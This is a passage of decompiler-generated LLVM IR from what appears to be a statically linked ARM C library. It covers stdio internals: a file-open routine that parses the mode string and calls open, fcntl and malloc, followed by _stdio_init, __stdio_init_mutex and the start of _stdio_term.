  %v7_23f70 = icmp eq i8 %v2_23f40, 97
  br i1 %v7_23f70, label %bb32, label %dec_label_pc_23f7c

bb32:                                             ; preds = %dec_label_pc_23f70
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_23fac

dec_label_pc_23f7c:                               ; preds = %dec_label_pc_23f70, %dec_label_pc_24030, %dec_label_pc_24004
  %v0_23f7c = call i32 @__GI___errno_location()
  store i32 %v0_23f7c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_23f84 = load i32, i32* @sb, align 4
  %v2_23f84 = icmp eq i32 %v0_23f84, 0
  %v2_23f88 = inttoptr i32 %v0_23f7c to i32*
  store i32 22, i32* %v2_23f88, align 4
  br i1 %v2_23f84, label %dec_label_pc_241fc, label %dec_label_pc_23f90

dec_label_pc_23f90:                               ; preds = %dec_label_pc_24054._crit_edge, %dec_label_pc_23f7c
  %v0_23f90 = load i32, i32* @sb, align 4
  %v1_23f90 = inttoptr i32 %v0_23f90 to i16*
  %v2_23f90 = load i16, i16* %v1_23f90, align 2
  %v3_23f90 = zext i16 %v2_23f90 to i32
  store i32 %v3_23f90, i32* %r3.global-to-local, align 4
  %v1_23f94 = and i32 %v3_23f90, 8192
  %v2_23f94 = icmp eq i32 %v1_23f94, 0
  br i1 %v2_23f94, label %dec_label_pc_241fc, label %dec_label_pc_23f9c

dec_label_pc_23f9c:                               ; preds = %dec_label_pc_23f90
  store i32 %v0_23f90, i32* @r0, align 4
  %v0_23fa0 = call i32 @free()
  store i32 %v0_23fa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_241fc

dec_label_pc_23fa8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_23fac

dec_label_pc_23fac:                               ; preds = %bb, %bb32, %dec_label_pc_23fa8
  %v1_23fc4 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_23fa8 ]
  %v1_23fac = add i32 %v0_23f40, 1
  %v2_23fac = inttoptr i32 %v1_23fac to i8*
  %v3_23fac = load i8, i8* %v2_23fac, align 1
  %v7_23fb0 = icmp eq i8 %v3_23fac, 98
  %v1_23fac.v0_23f40 = select i1 %v7_23fb0, i32 %v1_23fac, i32 %v0_23f40
  store i32 %v1_23fac.v0_23f40, i32* %r3.global-to-local, align 4
  %v1_23fbc = add i32 %v1_23fac.v0_23f40, 1
  %v2_23fbc = inttoptr i32 %v1_23fbc to i8*
  %v3_23fbc = load i8, i8* %v2_23fbc, align 1
  %v4_23fbc = zext i8 %v3_23fbc to i32
  store i32 %v4_23fbc, i32* @r3, align 4
  %v7_23fc0 = icmp eq i8 %v3_23fbc, 43
  br i1 %v7_23fc0, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_23fac
  store i32 %v1_23fc4, i32* @r3, align 4
  %v2_23fc8 = add nuw nsw i32 %v1_23fc4, 1
  store i32 %v2_23fc8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_23fac, %bb35
  %v2_23fcc = icmp eq i32 %v0_23f58, 0
  br i1 %v2_23fcc, label %dec_label_pc_23fd4, label %dec_label_pc_23ffc

dec_label_pc_23fd4:                               ; preds = %.thread3
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_23fd8 = call i32 @malloc(i32 80)
  store i32 %v1_23fd8, i32* %r0.global-to-local, align 4
  store i32 %v1_23fd8, i32* @sb, align 4
  %v3_23fdc = icmp eq i32 %v1_23fd8, 0
  br i1 %v3_23fdc, label %dec_label_pc_24200, label %dec_label_pc_23fe4

dec_label_pc_23fe4:                               ; preds = %dec_label_pc_23fd4
  %v2_23fe8 = add i32 %v1_23fd8, 8
  %v3_23fe8 = inttoptr i32 %v2_23fe8 to i32*
  store i32 0, i32* %v3_23fe8, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_23ff0 = load i32, i32* @sb, align 4
  %v3_23ff0 = inttoptr i32 %v2_23ff0 to i16*
  store i16 8192, i16* %v3_23ff0, align 2
  %v0_23ff4 = load i32, i32* @sb, align 4
  %v1_23ff4 = add i32 %v0_23ff4, 56
  store i32 %v1_23ff4, i32* @r0, align 4
  %v1_23ff8 = call i32 @__stdio_init_mutex(i32 %v1_23ff4)
  store i32 %v1_23ff8, i32* %r0.global-to-local, align 4
  %v0_23ffc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_23ffc

dec_label_pc_23ffc:                               ; preds = %.thread3, %dec_label_pc_23fe4
  %v0_24054 = phi i32 [ %v0_23f5c, %.thread3 ], [ %v0_23ffc.pre, %dec_label_pc_23fe4 ]
  %v1_23ffc = icmp slt i32 %v0_24054, 0
  br i1 %v1_23ffc, label %dec_label_pc_24054, label %dec_label_pc_24004

dec_label_pc_24004:                               ; preds = %dec_label_pc_23ffc
  %v0_24008 = load i32, i32* @r4, align 4
  %v2_24008 = and i32 %v0_24008, ptrtoint (i32* @global_var_20003.1601 to i32)
  %v1_2400c = or i32 %v2_24008, 1
  store i32 %v1_2400c, i32* %r2.global-to-local, align 4
  %v0_24010 = load i32, i32* @r6, align 4
  %v1_24010 = add i32 %v0_24010, 1
  %v2_24014 = and i32 %v1_24010, %v1_2400c
  store i32 %v2_24014, i32* %r3.global-to-local, align 4
  %v9_24018 = icmp eq i32 %v2_24014, %v1_2400c
  %v1_2401c = load i32, i32* @sb, align 4
  %v2_2401c = add i32 %v1_2401c, 4
  %v3_2401c = inttoptr i32 %v2_2401c to i32*
  store i32 %v0_24054, i32* %v3_2401c, align 4
  br i1 %v9_24018, label %dec_label_pc_24024, label %dec_label_pc_23f7c

dec_label_pc_24024:                               ; preds = %dec_label_pc_24004
  %v0_24024 = load i32, i32* @r4, align 4
  %v1_24024 = load i32, i32* @r6, align 4
  %v2_24024 = sub i32 -1, %v1_24024
  %v3_24024 = and i32 %v0_24024, %v2_24024
  store i32 %v3_24024, i32* @r3, align 4
  %v1_24028 = and i32 %v3_24024, 1024
  %v2_24028 = icmp eq i32 %v1_24028, 0
  br i1 %v2_24028, label %dec_label_pc_24048, label %dec_label_pc_24030

dec_label_pc_24030:                               ; preds = %dec_label_pc_24024
  %v0_24030 = load i32, i32* @r5, align 4
  store i32 %v0_24030, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_2403c = call i32 @__libc_fcntl(i32 %v0_24030, i32 4)
  store i32 %v2_2403c, i32* %r0.global-to-local, align 4
  %v2_24040 = icmp eq i32 %v2_2403c, 0
  br i1 %v2_24040, label %dec_label_pc_24030.dec_label_pc_24048_crit_edge, label %dec_label_pc_23f7c

dec_label_pc_24030.dec_label_pc_24048_crit_edge:  ; preds = %dec_label_pc_24030
  %v0_24048.pre = load i32, i32* @r6, align 4
  %v0_2404c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_24048

dec_label_pc_24048:                               ; preds = %dec_label_pc_24030.dec_label_pc_24048_crit_edge, %dec_label_pc_24024
  %v0_2404c = phi i32 [ %v0_2404c.pre, %dec_label_pc_24030.dec_label_pc_24048_crit_edge ], [ %v0_24024, %dec_label_pc_24024 ]
  %v0_24048 = phi i32 [ %v0_24048.pre, %dec_label_pc_24030.dec_label_pc_24048_crit_edge ], [ %v1_24024, %dec_label_pc_24024 ]
  %v1_24048 = and i32 %v0_24048, 131072
  store i32 %v1_24048, i32* %r3.global-to-local, align 4
  %v2_2404c = or i32 %v1_24048, %v0_2404c
  store i32 %v2_2404c, i32* @r4, align 4
  br label %dec_label_pc_24078

dec_label_pc_24054:                               ; preds = %dec_label_pc_23ffc
  %v7_24054 = icmp eq i32 %v0_24054, -1
  %v0_24060.pre = load i32, i32* @r4, align 4
  br i1 %v7_24054, label %dec_label_pc_24054._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_24054
  %v2_24058 = or i32 %v0_24060.pre, 131072
  store i32 %v2_24058, i32* @r4, align 4
  br label %dec_label_pc_24054._crit_edge

dec_label_pc_24054._crit_edge:                    ; preds = %dec_label_pc_24054, %bb36
  %v0_24060 = phi i32 [ %v2_24058, %bb36 ], [ %v0_24060.pre, %dec_label_pc_24054 ]
  %v0_2405c = load i32, i32* @r6, align 4
  store i32 %v0_2405c, i32* %r0.global-to-local, align 4
  store i32 %v0_24060, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_24068 = call i32 @__GI_open(i32 %v0_2405c, i32 %v0_24060)
  store i32 %v2_24068, i32* %r0.global-to-local, align 4
  %v1_2406c = icmp slt i32 %v2_24068, 0
  %v1_24070 = load i32, i32* @sb, align 4
  %v2_24070 = add i32 %v1_24070, 4
  %v3_24070 = inttoptr i32 %v2_24070 to i32*
  store i32 %v2_24068, i32* %v3_24070, align 4
  br i1 %v1_2406c, label %dec_label_pc_23f90, label %.dec_label_pc_24078_crit_edge

.dec_label_pc_24078_crit_edge:                    ; preds = %dec_label_pc_24054._crit_edge
  %v0_2407c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_24078

dec_label_pc_24078:                               ; preds = %.dec_label_pc_24078_crit_edge, %dec_label_pc_24048
  %v0_24094 = phi i32 [ %v0_2407c.pre, %.dec_label_pc_24078_crit_edge ], [ %v2_2404c, %dec_label_pc_24048 ]
  %v0_24078 = load i32, i32* @sb, align 4
  %v1_24078 = inttoptr i32 %v0_24078 to i16*
  %v2_24078 = load i16, i16* %v1_24078, align 2
  %v3_24078 = zext i16 %v2_24078 to i32
  %v1_2407c = urem i32 %v0_24094, 4
  %v1_24080 = and i32 %v0_24094, 1024
  %v1_24084 = and i32 %v3_24078, 8192
  %v1_24088 = add nuw nsw i32 %v1_2407c, 1
  %v2_2408c = or i32 %v1_24084, %v1_24080
  store i32 %v2_2408c, i32* %r3.global-to-local, align 4
  %v1_24090 = xor i32 %v1_24088, 3
  store i32 %v1_24090, i32* %r1.global-to-local, align 4
  %v1_24094 = and i32 %v0_24094, 131072
  store i32 %v1_24094, i32* %r2.global-to-local, align 4
  %v2_24094 = icmp eq i32 %v1_24094, 0
  %v1_24098 = add i32 %v0_24078, 4
  %v2_24098 = inttoptr i32 %v1_24098 to i32*
  %v3_24098 = load i32, i32* %v2_24098, align 4
  store i32 %v3_24098, i32* @r5, align 4
  br i1 %v2_24094, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_24078
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_24078, %bb37
  %v0_240a4 = phi i32 [ 0, %dec_label_pc_24078 ], [ 32768, %bb37 ]
  %v4_240a0 = mul nuw nsw i32 %v1_24090, 16
  %v5_240a0 = or i32 %v2_2408c, %v4_240a0
  store i32 %v5_240a0, i32* %r3.global-to-local, align 4
  %v2_240a4 = or i32 %v0_240a4, %v5_240a0
  store i32 %v2_240a4, i32* %r2.global-to-local, align 4
  %v8_240a8 = icmp eq i32 %v3_24098, 2147483647
  %v1_240ac = trunc i32 %v2_240a4 to i16
  store i16 %v1_240ac, i16* %v1_24078, align 2
  br i1 %v8_240a8, label %dec_label_pc_240dc, label %dec_label_pc_240b4

dec_label_pc_240b4:                               ; preds = %bb38
  %v0_240b4 = call i32 @__GI___errno_location()
  store i32 %v0_240b4, i32* @r4, align 4
  %v0_240bc = load i32, i32* @r5, align 4
  store i32 %v0_240bc, i32* @r0, align 4
  %v1_240c0 = inttoptr i32 %v0_240b4 to i32*
  %v2_240c0 = load i32, i32* %v1_240c0, align 4
  store i32 %v2_240c0, i32* @r5, align 4
  %v1_240c4 = call i32 @isatty(i32 %v0_240bc)
  store i32 %v1_240c4, i32* %r0.global-to-local, align 4
  %v2_240c8 = icmp eq i32 %v1_240c4, 0
  br i1 %v2_240c8, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_240b4
  %v1_240cc = load i32, i32* @sb, align 4
  %v2_240cc = inttoptr i32 %v1_240cc to i16*
  %v3_240cc = load i16, i16* %v2_240cc, align 2
  %v4_240cc = zext i16 %v3_240cc to i32
  %v2_240d0 = or i32 %v4_240cc, 256
  store i32 %v2_240d0, i32* %r3.global-to-local, align 4
  %v2_240d4 = trunc i32 %v2_240d0 to i16
  store i16 %v2_240d4, i16* %v2_240cc, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_240b4, %bb39
  %v0_240d8 = load i32, i32* @r5, align 4
  %v1_240d8 = load i32, i32* @r4, align 4
  %v2_240d8 = inttoptr i32 %v1_240d8 to i32*
  store i32 %v0_240d8, i32* %v2_240d8, align 4
  br label %dec_label_pc_240dc

dec_label_pc_240dc:                               ; preds = %bb38, %.thread5
  %v0_240dc = load i32, i32* @sb, align 4
  %v1_240dc = add i32 %v0_240dc, 8
  %v2_240dc = inttoptr i32 %v1_240dc to i32*
  %v3_240dc = load i32, i32* %v2_240dc, align 4
  store i32 %v3_240dc, i32* %r3.global-to-local, align 4
  %v2_240e0 = icmp eq i32 %v3_240dc, 0
  br i1 %v2_240e0, label %dec_label_pc_240e8, label %bb40

dec_label_pc_240e8:                               ; preds = %dec_label_pc_240dc
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_240ec = call i32 @malloc(i32 4096)
  store i32 %v1_240ec, i32* %r0.global-to-local, align 4
  %v2_240f0 = icmp eq i32 %v1_240ec, 0
  %v1_24100.pre = load i32, i32* @sb, align 4
  br i1 %v2_240f0, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_240e8
  %v2_240f4 = inttoptr i32 %v1_24100.pre to i16*
  %v3_240f4 = load i16, i16* %v2_240f4, align 2
  %v4_240f4 = zext i16 %v3_240f4 to i32
  %v2_240f8 = add i32 %v1_240ec, 4096
  store i32 %v2_240f8, i32* %r2.global-to-local, align 4
  %v2_240fc = or i32 %v4_240f4, 16384
  store i32 %v2_240fc, i32* %r3.global-to-local, align 4
  %v2_24100 = add i32 %v1_24100.pre, 8
  %v3_24100 = inttoptr i32 %v2_24100 to i32*
  store i32 %v1_240ec, i32* %v3_24100, align 4
  %v1_24104 = load i32, i32* %r2.global-to-local, align 4
  %v2_24104 = load i32, i32* @sb, align 4
  %v3_24104 = add i32 %v2_24104, 12
  %v4_24104 = inttoptr i32 %v3_24104 to i32*
  store i32 %v1_24104, i32* %v4_24104, align 4
  %v1_24108 = load i32, i32* %r3.global-to-local, align 4
  %v2_24108 = trunc i32 %v1_24108 to i16
  %v3_24108 = load i32, i32* @sb, align 4
  %v4_24108 = inttoptr i32 %v3_24108 to i16*
  store i16 %v2_24108, i16* %v4_24108, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_240e8
  %v2_2410019 = add i32 %v1_24100.pre, 8
  %v3_2410020 = inttoptr i32 %v2_2410019 to i32*
  store i32 0, i32* %v3_2410020, align 4
  %v2_2410c = load i32, i32* @sb, align 4
  %v3_2410c = add i32 %v2_2410c, 12
  %v4_2410c = inttoptr i32 %v3_2410c to i32*
  store i32 0, i32* %v4_2410c, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_240dc, %.thread9
  store i32 140, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_24118 = load i32, i32* @fp, align 4
  %v2_24118 = add i32 %v0_24118, 140
  %v3_24118 = inttoptr i32 %v2_24118 to i32*
  %v4_24118 = load i32, i32* %v3_24118, align 4
  store i32 %v4_24118, i32* %r3.global-to-local, align 4
  %v2_2411c = load i32, i32* @sb, align 4
  %v3_2411c = add i32 %v2_2411c, 2
  %v4_2411c = inttoptr i32 %v3_2411c to i8*
  store i8 0, i8* %v4_2411c, align 1
  %v0_24120 = load i32, i32* @sb, align 4
  %v1_24120 = inttoptr i32 %v0_24120 to i16*
  %v2_24120 = load i16, i16* %v1_24120, align 2
  %v3_24120 = zext i16 %v2_24120 to i32
  store i32 %v3_24120, i32* %r2.global-to-local, align 4
  %v0_24124 = load i32, i32* %r3.global-to-local, align 4
  %v1_24124 = inttoptr i32 %v0_24124 to i32*
  %v2_24124 = load i32, i32* %v1_24124, align 4
  store i32 %v2_24124, i32* %r1.global-to-local, align 4
  %v1_24128 = add i32 %v0_24120, 8
  %v2_24128 = inttoptr i32 %v1_24128 to i32*
  %v3_24128 = load i32, i32* %v2_24128, align 4
  store i32 %v3_24128, i32* %r3.global-to-local, align 4
  %v1_2412c = and i32 %v3_24120, 8192
  %v2_2412c = icmp eq i32 %v1_2412c, 0
  %v2_24130 = add i32 %v0_24120, 20
  %v3_24130 = inttoptr i32 %v2_24130 to i32*
  store i32 %v3_24128, i32* %v3_24130, align 4
  %v0_24134 = load i32, i32* %r0.global-to-local, align 4
  %v1_24134 = load i32, i32* @sb, align 4
  %v2_24134 = add i32 %v1_24134, 44
  %v3_24134 = inttoptr i32 %v2_24134 to i32*
  store i32 %v0_24134, i32* %v3_24134, align 4
  %v0_24138 = load i32, i32* %r1.global-to-local, align 4
  %v1_24138 = load i32, i32* @sb, align 4
  %v2_24138 = add i32 %v1_24138, 52
  %v3_24138 = inttoptr i32 %v2_24138 to i32*
  store i32 %v0_24138, i32* %v3_24138, align 4
  %v0_2413c = load i32, i32* %r3.global-to-local, align 4
  %v1_2413c = load i32, i32* @sb, align 4
  %v2_2413c = add i32 %v1_2413c, 24
  %v3_2413c = inttoptr i32 %v2_2413c to i32*
  store i32 %v0_2413c, i32* %v3_2413c, align 4
  %v0_24140 = load i32, i32* %r3.global-to-local, align 4
  %v1_24140 = load i32, i32* @sb, align 4
  %v2_24140 = add i32 %v1_24140, 28
  %v3_24140 = inttoptr i32 %v2_24140 to i32*
  store i32 %v0_24140, i32* %v3_24140, align 4
  %v0_24144 = load i32, i32* %r3.global-to-local, align 4
  %v1_24144 = load i32, i32* @sb, align 4
  %v2_24144 = add i32 %v1_24144, 16
  %v3_24144 = inttoptr i32 %v2_24144 to i32*
  store i32 %v0_24144, i32* %v3_24144, align 4
  br i1 %v2_2412c, label %dec_label_pc_24200, label %dec_label_pc_2414c

dec_label_pc_2414c:                               ; preds = %bb40
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_24150 = load i32, i32* @fp, align 4
  %v2_24150 = add i32 %v0_24150, 96
  %v3_24150 = inttoptr i32 %v2_24150 to i32*
  %v4_24150 = load i32, i32* %v3_24150, align 4
  store i32 %v4_24150, i32* %r8.global-to-local, align 4
  store i32 248, i32* %r3.global-to-local, align 4
  %v2_24158 = add i32 %v0_24150, 248
  %v3_24158 = inttoptr i32 %v2_24158 to i32*
  %v4_24158 = load i32, i32* %v3_24158, align 4
  store i32 %v4_24158, i32* %r4.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v2_24160 = ptrtoint i32* %stack_var_-56 to i32
  %v2_24164 = add i32 %v0_24150, 164
  %v3_24164 = inttoptr i32 %v2_24164 to i32*
  %v4_24164 = load i32, i32* %v3_24164, align 4
  store i32 %v4_24150, i32* %r1.global-to-local, align 4
  store i32 %v4_24158, i32* %r2.global-to-local, align 4
  store i32 %v2_24160, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_24164)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_24180 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_24180, i32* %r0.global-to-local, align 4
  %v0_24184 = load i32, i32* @fp, align 4
  %v2_24184 = add i32 %v0_24184, 36
  %v3_24184 = inttoptr i32 %v2_24184 to i32*
  %v4_24184 = load i32, i32* %v3_24184, align 4
  call void @__pseudo_branch(i32 %v4_24184)
  store i32 224, i32* %r3.global-to-local, align 4
  %v0_24194 = load i32, i32* @fp, align 4
  %v2_24194 = add i32 %v0_24194, 224
  %v3_24194 = inttoptr i32 %v2_24194 to i32*
  %v4_24194 = load i32, i32* %v3_24194, align 4
  store i32 %v4_24194, i32* %r4.global-to-local, align 4
  %v0_24198 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_24198, i32* %r1.global-to-local, align 4
  store i32 %v4_24194, i32* %r2.global-to-local, align 4
  store i32 %v2_23f50, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_24164)
  store i32 %v4_24194, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_24184)
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_241bc = load i32, i32* @fp, align 4
  %v2_241bc = add i32 %v0_241bc, 108
  %v3_241bc = inttoptr i32 %v2_241bc to i32*
  %v4_241bc = load i32, i32* %v3_241bc, align 4
  store i32 %v4_241bc, i32* @ip, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_241c4 = inttoptr i32 %v4_241bc to i32*
  %v2_241c4 = load i32, i32* %v1_241c4, align 4
  store i32 %v2_241c4, i32* %r2.global-to-local, align 4
  store i32 %v2_23f50, i32* %r0.global-to-local, align 4
  %v1_241cc = load i32, i32* @sb, align 4
  %v2_241cc = add i32 %v1_241cc, 32
  %v3_241cc = inttoptr i32 %v2_241cc to i32*
  store i32 %v2_241c4, i32* %v3_241cc, align 4
  %v0_241d0 = load i32, i32* @fp, align 4
  %v1_241d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_241d0 = add i32 %v1_241d0, %v0_241d0
  %v3_241d0 = inttoptr i32 %v2_241d0 to i32*
  %v4_241d0 = load i32, i32* %v3_241d0, align 4
  store i32 %v4_241d0, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_241d8 = load i32, i32* @sb, align 4
  %v1_241d8 = load i32, i32* @ip, align 4
  %v2_241d8 = inttoptr i32 %v1_241d8 to i32*
  store i32 %v0_241d8, i32* %v2_241d8, align 4
  call void @__pseudo_branch(i32 %v4_241d0)
  store i32 %v2_24160, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_241d0)
  br label %dec_label_pc_24200

dec_label_pc_241fc:                               ; preds = %dec_label_pc_23f90, %dec_label_pc_23f7c, %dec_label_pc_23f9c
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_24200

dec_label_pc_24200:                               ; preds = %bb40, %dec_label_pc_23fd4, %dec_label_pc_2414c, %dec_label_pc_241fc
  %v0_24200 = load i32, i32* @sb, align 4
  store i32 %v0_24200, i32* %r0.global-to-local, align 4
  %v2_24208 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_24208, i32* @r4, align 4
  store i32 %v6_23f3c, i32* @r5, align 4
  store i32 %v9_23f3c, i32* @r6, align 4
  store i32 %v18_23f3c, i32* @sb, align 4
  store i32 %v24_23f3c, i32* @fp, align 4
  ret i32 %v0_24200

; uselistorder directives
  uselistorder i32 %v1_24100.pre, { 2, 1, 0 }
  uselistorder i32 %v0_24094, { 1, 2, 0 }
  uselistorder i32 %v0_24060, { 1, 0 }
  uselistorder i32 %v1_24024, { 1, 0 }
  uselistorder i32 %v0_24024, { 1, 0 }
  uselistorder i32 %v1_2400c, { 1, 0, 2 }
  uselistorder i32 %v1_23fc4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i8 114, { 1, 0 }
  uselistorder label %dec_label_pc_24200, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_241fc, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_240dc, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_24054._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_23ffc, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_23fac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_23f7c, { 1, 2, 0 }
}

define i32 @function_24214(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_24214:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_24214 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_24214, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_24214
  %v3_2421c = and i32 %arg4, %arg3
  store i32 %v3_2421c, i32* %r0.global-to-local, align 4
  %v2_24220 = trunc i32 %v3_2421c to i16
  %v4_24220 = inttoptr i32 %v3_2421c to i16*
  store i16 %v2_24220, i16* %v4_24220, align 2
  %v5_24220 = load i32, i32* @r6, align 4
  %v6_24220 = load i32, i32* %r0.global-to-local, align 4
  %v7_24220 = sub i32 %v6_24220, %v5_24220
  %v2_24224 = load i32, i32* @ip, align 4
  %v4_24224 = mul i32 %v2_24224, 2
  %v5_24224 = and i32 %v4_24224, %v7_24220
  %v4_2422c = inttoptr i32 %v5_24224 to i32*
  store i32 %v5_24224, i32* %v4_2422c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_24214, %bb
  %v4_24240 = phi i32 [ %tmp, %dec_label_pc_24214 ], [ 0, %bb ]
  ret i32 %v4_24240

; uselistorder directives
  uselistorder i32 %v3_2421c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_24248 = call i32 @__GI___errno_location()
  store i32 %v0_24248, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_24254 = inttoptr i32 %v0_24248 to i32*
  %v2_24254 = load i32, i32* %v1_24254, align 4
  store i32 %v2_24254, i32* @r6, align 4
  %v1_24258 = call i32 @isatty(i32 0)
  %v2_24260 = icmp eq i32 %v1_24258, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  br i1 %v2_24260, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_2426c = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20324) to i16*), align 4
  %v7_2426c = zext i16 %v5_2426c to i32
  %v2_24270 = xor i32 %v7_2426c, 256
  store i32 %v2_24270, i32* @r3, align 4
  %v2_24274 = trunc i32 %v2_24270 to i16
  store i16 %v2_24274, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20324) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_2427c = call i32 @isatty(i32 1)
  %v2_24280 = icmp eq i32 %v1_2427c, 0
  br i1 %v2_24280, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_24288 = load i32, i32* @r4, align 4
  %v2_2428c = add i32 %v1_24288, 20404
  %v3_2428c = inttoptr i32 %v2_2428c to i16*
  %v4_2428c = load i16, i16* %v3_2428c, align 2
  %v2_24290 = xor i16 %v4_2428c, 256
  store i16 %v2_24290, i16* %v3_2428c, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_24298 = load i32, i32* @r6, align 4
  %v1_24298 = load i32, i32* @r5, align 4
  %v2_24298 = inttoptr i32 %v1_24298 to i32*
  store i32 %v0_24298, i32* %v2_24298, align 4
  ret i32 %v1_2427c

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39484), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_242c8 = call i32 @memcpy()
  ret i32 %v0_242c8
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_242e0 = load i32, i32* @r4, align 4
  store i32 %v3_242e0, i32* %stack_var_-24, align 4
  store i32 224, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r6.global-to-local, align 4
  %v4_242f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 224) to i32*), align 4
  store i32 %v4_242f0, i32* @r0, align 4
  %v1_242f4 = call i32 @__stdio_init_mutex(i32 %v4_242f0)
  store i32 %v1_242f4, i32* %r0.global-to-local, align 4
  store i32 248, i32* %r3.global-to-local, align 4
  %v4_242fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 248) to i32*), align 4
  store i32 %v4_242fc, i32* @r0, align 4
  %v1_24300 = call i32 @__stdio_init_mutex(i32 %v4_242fc)
  store i32 %v1_24300, i32* %r0.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_24308 = load i32, i32* %r6.global-to-local, align 4
  %v2_24308 = add i32 %v0_24308, 108
  %v3_24308 = inttoptr i32 %v2_24308 to i32*
  %v4_24308 = load i32, i32* %v3_24308, align 4
  store i32 %v4_24308, i32* %r3.global-to-local, align 4
